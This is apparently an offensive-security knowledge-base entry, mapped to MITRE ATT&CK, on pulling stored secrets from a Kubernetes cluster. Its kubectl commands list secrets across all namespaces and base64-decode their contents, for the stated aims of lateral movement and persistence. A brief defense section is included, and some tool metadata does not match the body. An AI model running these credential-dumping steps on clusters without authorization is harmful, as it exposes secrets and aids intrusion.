---
tags:
  - credential-access
  - kubernetes
type: procedure
tools:
  - '[[tools/binaryedge.io]]'
tactics:
  - '[[Credential Access]]'
commands: []
platforms:
  - Kubernetes
techniques:
  - '[[Unsecured Credentials]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Private Keys]]'
id: 88d60da4-c12f-4d3a-953b-14a8e8d48f77
created_at: '2025-12-10T05:44:16.326Z'
updated_at: '2025-12-10T05:44:16.326Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0006]]'
mitre_techniques:
  - '[[T1552]]'
---
# Retrieve Internal Credentials from Kubernetes

## Summary

This procedure uses elevated access in a Kubernetes cluster to extract stored secrets and credentials, enabling further internal access.

## Description

Attackers query Kubernetes secrets to retrieve sensitive data like credentials. This exploits misconfigured access controls, resulting in exposure of internal assets.

## Requirements

1. Cluster-admin level access
2. kubectl configured
3. Knowledge of Kubernetes resource querying

## Defense

Defensive measures and detection strategies:

- Encrypt secrets and use external secret management
- Audit logs for secret access attempts

## Objectives

1. Extract credentials from secrets
2. Gain access to internal instances
3. Achieve persistence or lateral movement

## Instructions

### Step 1: List Secrets

**Context**: Query all secrets in the cluster.

Use #kubectl-get-secrets:

```bash
kubectl get secrets --all-namespaces
```

> This lists available secrets.

### Step 2: Extract Secret Data

**Context**: Decode and retrieve secret contents.

```bash
kubectl get secret <secret-name> -o yaml | grep data
# Decode base64 values as needed
echo <base64-data> | base64 -d
```

> This reveals credentials like keys or tokens.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques

- [[Private Keys]]

## Commands Used

- #kubectl-get-secrets

## Tools Used

- #kubectl-get-pods

## Tags

- [[Credential Access]]
- #kubernetes
